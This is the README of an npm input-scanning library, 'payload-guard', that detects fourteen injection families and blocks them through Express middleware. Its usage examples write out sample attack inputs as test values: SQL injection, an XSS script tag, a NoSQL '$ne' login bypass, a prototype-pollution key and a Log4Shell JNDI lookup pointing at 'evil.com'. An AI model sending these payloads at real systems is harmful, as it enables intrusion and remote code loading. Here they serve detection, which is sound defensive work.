<div align="center">

<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/banner.svg" alt="payload-guard: catch injection attacks before they reach your app" width="100%">

[![npm version](https://img.shields.io/npm/v/payload-guard.svg?style=flat-square&color=3fb950)](https://www.npmjs.com/package/payload-guard)
[![downloads](https://img.shields.io/npm/dm/payload-guard.svg?style=flat-square&color=58a6ff)](https://www.npmjs.com/package/payload-guard)
[![zero dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg?style=flat-square)](./package.json)
[![types](https://img.shields.io/badge/types-included-3178c6.svg?style=flat-square)](./index.d.ts)
[![node](https://img.shields.io/node/v/payload-guard.svg?style=flat-square)](./package.json)
[![license](https://img.shields.io/npm/l/payload-guard.svg?style=flat-square)](./LICENSE)

**One call. Fourteen attack families. Zero dependencies.**

</div>

```js
const guard = require('payload-guard');

guard.hasSql("' OR 1=1 --");               // true
guard.hasSql('${jndi:ldap://evil.com/a}'); // true  (Log4Shell)
guard.hasSql('Hello, my name is Ana');     // false
```

<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/demo.svg" alt="Terminal demo: payload-guard blocking SQL injection, XSS, Log4Shell, SSRF and prototype pollution while allowing normal text" width="100%">

## Why payload-guard?

- 🛡️ **14 attack families**: SQLi, XSS, command injection, path traversal, NoSQL, LDAP, SSTI, CRLF, **SSRF, XXE, prototype pollution, Log4Shell, XPath, Unicode tricks**.
- 🕵️ **Sees through evasion**: URL-encoded, double-encoded, HTML entities, `UN/**/ION` comments and fullwidth Unicode are decoded before scanning.
- ⚡ **Drop-in Express middleware**: `app.use(guard.middleware())` and malicious bodies, queries and params get a `400`.
- 🧩 **Extensible**: add your own rules with `addValidator`.
- 📦 **Zero dependencies**, tiny, CommonJS + ESM, **TypeScript types included**.
- 🎯 **Low false positives**: matches attack *syntax*, not bare words.
- 🌍 Messages in **English and Spanish**.

## Install

```bash
npm install payload-guard
```

```js
// Node (CommonJS)
const payloadGuard = require('payload-guard');

// ESM / TypeScript / React, Vue, Angular
import payloadGuard from 'payload-guard';
```

## Protect an Express API in one line

```js
const express = require('express');
const guard = require('payload-guard');

const app = express();
app.use(express.json());
app.use(guard.middleware());      // scans req.body, req.query, req.params

// POST /login  { "user": { "$ne": null } }
// -> 400 { "error": "Malicious input detected",
//          "threats": [{ "type": "nosql-injection", "severity": "high", "path": "body.user" }] }
```

Options: `sources`, `status`, and `onThreat(req, res, threats)` for custom responses (logging, alerting, rate-limiting offenders).

## What it catches

<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/coverage.svg" alt="The 14 attack families detected by payload-guard" width="100%">

## Attackers encode. payload-guard decodes.

Regexes on raw input are trivially bypassed. Every value is also scanned after
URL decoding (up to 3 rounds), HTML-entity decoding, `\u`/`\x` unescaping, NFKC
Unicode normalization and SQL-comment stripping. Threats visible only after
decoding are flagged with `evasion: true`.

<img src="https://raw.githubusercontent.com/AndreyMartinez/sqli-guard/main/assets/evasion.svg" alt="Encoded payloads that bypass naive matching but are caught by payload-guard" width="100%">

```js
guard.scan('%27%20OR%201%3D1--').threats[0];
// { type: 'sql-injection', severity: 'high', match: "' OR 1=1", evasion: true, ... }
```

## Scan nested data

```js
guard.scanDeep({ user: { bio: "' OR 1=1 --" }, tags: ['ok', '<script>x</script>'] });
// { safe: false, threats: [ { path: 'user.bio', ... }, { path: 'tags.1', ... } ] }
```

Object **keys** are scanned too, so `{"__proto__": ...}` and `{"$where": ...}` payloads are caught.

## Basic use

`hasSql(value)` returns `true` if it detects ANY threat, otherwise `false`.

```js
payloadGuard.hasSql('SELECT * FROM users');       // true
payloadGuard.hasSql("' OR 1=1 --");               // true
payloadGuard.hasSql('<script>alert(1)</script>'); // true
payloadGuard.hasSql('Your name');                 // false
payloadGuard.hasSql(null);                         // false  (empty = safe)
```

`scan(value)` returns the list of threats found.

```js
payloadGuard.scan("' OR 1=1 --");
// {
//   safe: false,
//   value: "' OR 1=1 --",
//   threats: [
//     { type: 'sql-injection', severity: 'high',
//       message: 'Possible SQL injection detected.', match: "' OR 1=1" }
//   ]
// }

payloadGuard.isSafe('Your name'); // true
```

## Language

Messages default to English. Pass `lang: 'es'` for Spanish.

```js
const { createScanner } = payloadGuard;

const es = createScanner({ lang: 'es' });
es.scan('<script>x</script>').threats[0].message;
// "Posible XSS (script/HTML malicioso) detectado."
```


## Custom validators (sub-functions)

Add your own patterns with `addValidator(name, spec)`.

```js
const scanner = payloadGuard.createScanner();

// 1) With a RegExp
scanner.addValidator('no-emoji', /\p{Emoji}/u);

// 2) With config
scanner.addValidator('alphanumeric-only', {
  pattern: /[^a-z0-9\s]/i,
  severity: 'medium',            // low | medium | high
  message: 'Disallowed characters.'
});

// 3) With a test function (returns a boolean or the matched text)
scanner.addValidator('max-length', {
  test: (value) => value.length > 100 ? value.slice(0, 100) + '…' : false,
  severity: 'low',
  message: 'Input exceeds 100 characters.'
});

scanner.scan('hello 🚀').safe;   // false  (no-emoji rule)
scanner.listValidators();       // ['no-emoji', 'alphanumeric-only', 'max-length']
scanner.removeValidator('no-emoji');
```

`addValidator` is chainable:

```js
scanner
  .addValidator('a', /a/)
  .addValidator('b', /b/);
```

The `message` field also accepts an object for bilingual output:

```js
scanner.addValidator('no-emoji', {
  pattern: /\p{Emoji}/u,
  message: { en: 'Emojis are not allowed.', es: 'No se permiten emojis.' }
});
```


## Scanner options

`createScanner(options)`:

| option        | values                        | description                          |
|---------------|-------------------------------|--------------------------------------|
| `lang`        | `'en'` \| `'es'`             | Message language (default `'en'`).   |
| `categories`  | `string[]`                    | Limit which built-in detectors run.  |
| `minSeverity` | `'low'`\|`'medium'`\|`'high'` | Minimum reported severity.           |
| `decode`      | `boolean`                     | Scan decoded views to catch evasion (default `true`). |

```js
// SQL injection only, ignore everything else
const sqlOnly = payloadGuard.createScanner({ categories: ['sql-injection'] });

// Only high-severity threats
const strict = payloadGuard.createScanner({ minSeverity: 'high' });
```

Available categories: `sql-injection`, `xss`, `command-injection`,
`path-traversal`, `nosql-injection`, `ldap-injection`, `template-injection`,
`crlf-injection`, `ssrf`, `xxe`, `prototype-pollution`, `log4shell`,
`xpath-injection`, `unicode-evasion`.


## API

| Method                      | Returns   | Description                             |
|-----------------------------|-----------|----------------------------------------|
| `hasSql(value)`             | `boolean` | `true` if any threat is found.         |
| `isSafe(value)`             | `boolean` | Inverse of `hasSql`.                   |
| `scan(value)`               | `object`  | `{ safe, value, threats[] }`.          |
| `scanDeep(obj)`             | `object`  | Scans nested objects/arrays + keys.    |
| `middleware(options)`       | `function`| Express/Connect guard (HTTP 400).      |
| `addValidator(name, spec)`  | `Scanner` | Register a custom sub-function.        |
| `removeValidator(name)`     | `boolean` | Remove a custom validator.             |
| `listValidators()`          | `string[]`| Registered validator names.            |
| `createScanner(options)`    | `Scanner` | Isolated instance.                     |

> **Note:** this library reduces false positives by matching attack *syntax*,
> not bare words. Even so, it is a detection layer — it is **not a replacement**
> for parameterized queries and proper server-side escaping/sanitization.


## Tests

```
npm test
```

## Contributing

Found a bypass or a false positive? [Open an issue](https://github.com/AndreyMartinez/sqli-guard/issues) with the payload. Run `npm test` before sending a PR, and `npm run assets` to regenerate the README images from real scanner output.

## License

MIT
